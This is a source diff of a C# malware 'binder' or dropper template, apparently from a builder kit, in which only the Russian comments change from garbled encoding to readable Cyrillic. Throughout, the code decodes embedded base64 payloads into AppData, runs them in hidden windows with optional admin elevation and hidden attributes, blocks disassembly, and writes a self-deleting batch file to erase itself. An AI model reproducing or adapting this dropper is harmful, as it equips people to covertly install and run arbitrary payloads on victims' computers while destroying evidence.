@@ -1,4 +1,4 @@
-#region Çàâèñèìîñòè
+#region Зависимости
 using System;
 using System.Diagnostics;
 using System.IO;
@@ -10,7 +10,7 @@ using System.Threading;
 using %SpaceName%;
 #endregion
 
-#region Ñâîéñòâà ôàéëà
+#region Свойства файла
 [module: SuppressIldasm]
 [assembly: AssemblyTitle(AssBooster.TITLE)]
 [assembly: AssemblyDescription(AssBooster.DESCRIPTION)]
@@ -30,46 +30,46 @@ namespace %SpaceName%
         [STAThread]
         public static void Main()
         {
-            // Ïðîâåðêà íà îñòàíîâêó ïîòîêà ïåðåä çàïóñêîì âñåõ ôóíêöèé
+            // Проверка на остановку потока перед запуском всех функций
             if (PanelWork.SleepTime)
             {
                 PanelWork.Sleeping(2000);
             }
 
-            // Ñïèñîê øèôðîâàííûõ ôàéëîâ äëÿ çàãðóçêè
+            // Список шифрованных файлов для загрузки
             string[] files = new string[] { [BIN] };
-            // Ïåðåáèðàåì ñïèñîê ôàéëîâ èç ìàññèâà
+            // Перебираем список файлов из массива
             foreach (string payload in files)
             {
-                // Ðàçáèâàåì ñòðîêè íà ïîäñòðîêè 
+                // Разбиваем строки на подстроки 
                 string b64 = payload.Split('™')[0], plName = payload.Split('™')[1];
                 DropFiles(b64, plName);
             }
-            // Ïðîâåðÿåì íà çàïóñê ñàìîóäàëåíèÿ áèëä ôàéëà
+            // Проверяем на запуск самоудаления билд файла
             if (PanelWork.SuicideActivate)
             {
-                // Ïðîâåðÿåì *.bat ôàéë
+                // Проверяем *.bat файл
                 if (!File.Exists(GlobalPath.SuicideFile))
                 {
-                    // Ñîçäà¸ì áèíàðíèê
+                    // Создаём бинарник
                     Suicide.Inizialize(GlobalPath.SuicideFile);
-                    CommandRunner.RunFile(GlobalPath.SuicideFile); // Çàïóñêàåì áàòíèê
+                    CommandRunner.RunFile(GlobalPath.SuicideFile); // Запускаем батник
                 }
                 else
                 {
-                    CommandRunner.RunFile(GlobalPath.SuicideFile); // Çàïóñêàåì áàòíèê
+                    CommandRunner.RunFile(GlobalPath.SuicideFile); // Запускаем батник
                 }
             }
         }
 
         /// <summary>
-        /// Ìåòîä äëÿ äðîïà ôàéëîâ â îïðåäåë¸ííóþ ïàïêó
+        /// Метод для дропа файлов в определённую папку
         /// </summary>
-        /// <param name="payload">Ôàéë äëÿ ðàñøèôðîâêè</param>
-        /// <param name="payloadName">Èìÿ ôàéëà</param>
+        /// <param name="payload">Файл для расшифровки</param>
+        /// <param name="payloadName">Имя файла</param>
         private static void DropFiles(string payload, string payloadName)
         {
-            // Ñïèñîê ðàñøèðåíèé êîòîðûå ìîæíî çàïóñêàòü
+            // Список расширений которые можно запускать
             var extensionrunner = new string[]
             {
                ".exe", ".bat", ".txt", ".scr", ".doc", ".docx",
@@ -77,28 +77,28 @@ namespace %SpaceName%
             };
             try
             {
-                // Ñîåäèíÿåì èìÿ ôàéëà è ïóòü êóäà áóäåì ñîõðàíÿòü âñ¸
+                // Соединяем имя файла и путь куда будем сохранять всё
                 string FinalPath = Path.Combine(GlobalPath.AppData, payloadName);
-                // Ðàñøèôðîâûâàåì ñòðîêè ôàéë(à)îâ èç base64
+                // Расшифровываем строки файл(а)ов из base64
                 byte[] EncryptBinder = Convert.FromBase64String(payload);
                 if (!File.Exists(FinalPath))
                 {
-                    // Ñîõðàíÿåì ôàéë(û)
+                    // Сохраняем файл(ы)
                     File.WriteAllBytes(FinalPath, EncryptBinder);
-                    // Ïåðåáèðàåì öèêë ðàñøèðåíèé
+                    // Перебираем цикл расширений
                     foreach (var bypassfiles in extensionrunner)
                     {
-                        // Ïðîâåðÿåì íà ñõîæèå ðàñøèðåíèÿ ôàéë(à)îâ
+                        // Проверяем на схожие расширения файл(а)ов
                         if (FinalPath.EndsWith(bypassfiles, StringComparison.InvariantCultureIgnoreCase))
                         {
-                            // Çàïóñêàåì ôàéë
+                            // Запускаем файл
                             CommandRunner.RunFile(FinalPath);
                         }
                     }
                 }
                 else
                 {
-                    // Çàïóñêàåì ôàéë
+                    // Запускаем файл
                     CommandRunner.RunFile(FinalPath);
                 }
             }
@@ -108,28 +108,28 @@ namespace %SpaceName%
     public static class Suicide
     {
         /// <summary>
-        /// Ìåòîä äëÿ ñîçäàíèÿ áàòíèêà äëÿ ñàìîóäàëåíèÿ áèëä ôàéëà
+        /// Метод для создания батника для самоудаления билд файла
         /// </summary>
-        /// <param name="pathfile">Èìÿ áèëä ôàéëà</param>
+        /// <param name="pathfile">Имя билд файла</param>
         public static void Inizialize(string pathfile)
         {
-            // Ïðîâåðÿåì åñëè ñòðîêà íå ïóñòàÿ è ðàñøèðåíèÿ ôàéëà ÿâëÿåòñÿ *.bat
+            // Проверяем если строка не пустая и расширения файла является *.bat
             if (!string.IsNullOrWhiteSpace(pathfile) && pathfile.EndsWith(".bat", StringComparison.InvariantCultureIgnoreCase))
             {
                 try
                 {
                     using (var sw = new StreamWriter(pathfile))
                     {
-                        sw.WriteLine("@echo off"); // Íå ïîêàûâàòü âûâîä ñîîáùåíèé
-                        sw.WriteLine("chcp 1251 >NUL"); // Çàäà¸ì êîäèðîâêó äëÿ ÷òåíèÿ êèðèëëèöû
-                        sw.WriteLine("cls"); // îò÷èùÿåì êîíñîëü
-                        sw.WriteLine(":loop"); // Ñîçäà¸ì öèêë
-                        sw.WriteLine(string.Concat("del \"", GlobalPath.GetFileName, "\"")); // Óäàëÿåì áèëä ôàéëà
-                        sw.WriteLine(string.Concat("if Exist \"", GlobalPath.GetFileName, "\" GOTO loop")); // Ïðîâåðÿåì ôàéë â öèêëå
-                        sw.WriteLine("chcp 866 >NUL"); // Äëÿ ÷òåíèÿ êèðèëëèöû â êîíñîëè
-                        sw.WriteLine("echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ");
-                        sw.WriteLine("del %0"); // Ñàìîóäàëÿåìñÿ
-                        sw.Flush(); // Îò÷èùàåì áóôåð ïîòîêà
+                        sw.WriteLine("@echo off"); // Не покаывать вывод сообщений
+                        sw.WriteLine("chcp 1251 >NUL"); // Задаём кодировку для чтения кириллицы
+                        sw.WriteLine("cls"); // отчищяем консоль
+                        sw.WriteLine(":loop"); // Создаём цикл
+                        sw.WriteLine(string.Concat("del \"", GlobalPath.GetFileName, "\"")); // Удаляем билд файла
+                        sw.WriteLine(string.Concat("if Exist \"", GlobalPath.GetFileName, "\" GOTO loop")); // Проверяем файл в цикле
+                        sw.WriteLine("chcp 866 >NUL"); // Для чтения кириллицы в консоли
+                        sw.WriteLine("echo НННННННННННННННННННННННННННННННН");
+                        sw.WriteLine("del %0"); // Самоудаляемся
+                        sw.Flush(); // Отчищаем буфер потока
                     }
                 }
                 catch { }
@@ -163,9 +163,9 @@ namespace %SpaceName%
     public static class PanelWork
     {
         /// <summary>
-        /// Ìåòîä äëÿ îñòàíîâêè ïîòîêà â ìèëèñåêóíäàõ
+        /// Метод для остановки потока в милисекундах
         /// </summary>
-        /// <param name="time">Êîë-âî ìèëèñåêóíä</param>
+        /// <param name="time">Кол-во милисекунд</param>
         public static void Sleeping(int time)
         {
             try
@@ -176,9 +176,9 @@ namespace %SpaceName%
         }
 
         /// <summary>
-        /// Ìåòîä äëÿ ïðîâåðêè ðàçìåðà ôàéëà
+        /// Метод для проверки размера файла
         /// </summary>
-        /// <param name="filename">Èìÿ ôàéëà</param>
+        /// <param name="filename">Имя файла</param>
         /// <returns></returns>
         public static bool CheckerFile(string filename)
         {
@@ -199,32 +199,32 @@ namespace %SpaceName%
     public static class CommandRunner
     {
         /// <summary>
-        /// Ìåòîä äëÿ çàïóñêà ôàéë(à)îâ ñ ïàðàìåòðàìè
+        /// Метод для запуска файл(а)ов с параметрами
         /// </summary>
-        /// <param name="filename">Èìÿ ôàéëà</param>
+        /// <param name="filename">Имя файла</param>
         public static void RunFile(string filename)
         {
-            // Åñëè ñòðîêà íå ïóñòàÿ è ôàéë íå èìååò íóëåâîé ðàçìåð
+            // Если строка не пустая и файл не имеет нулевой размер
             if (!string.IsNullOrWhiteSpace(filename) && PanelWork.CheckerFile(filename))
             {
                 try
                 {
-                    // Ñêðûâàåì êîíñîëü çàïóñêà
+                    // Скрываем консоль запуска
                     var style = ProcessWindowStyle.Hidden;
-                    // Ïåðåäà¸ì ïàðàìåòðû äëÿ çàïóñêà
+                    // Передаём параметры для запуска
                     var startInfo = new ProcessStartInfo
                     {
                         FileName = filename,
                         CreateNoWindow = false,
                         WindowStyle = style,
                     };
-                    // Ïðîâåðÿåì çàïóñê îò Àäìèíà
+                    // Проверяем запуск от Админа
                     if (PanelWork.RunFromAdmin)
                     {
                         startInfo.UseShellExecute = true;
                         startInfo.Verb = "runas";
                     }
-                    // Ïðîâåðÿåì ñêðûâàòü ëè ôàéë 
+                    // Проверяем скрывать ли файл 
                     if (PanelWork.HideFiles)
                     {
                         try
@@ -233,7 +233,7 @@ namespace %SpaceName%
                         }
                         catch { }
                     }
-                    // Çàïóñêàåì ïðîöåññ ñ ïàðàìåòðàìè
+                    // Запускаем процесс с параметрами
                     using (var info = Process.Start(startInfo)) { info.Refresh(); }
                 }
                 catch { }
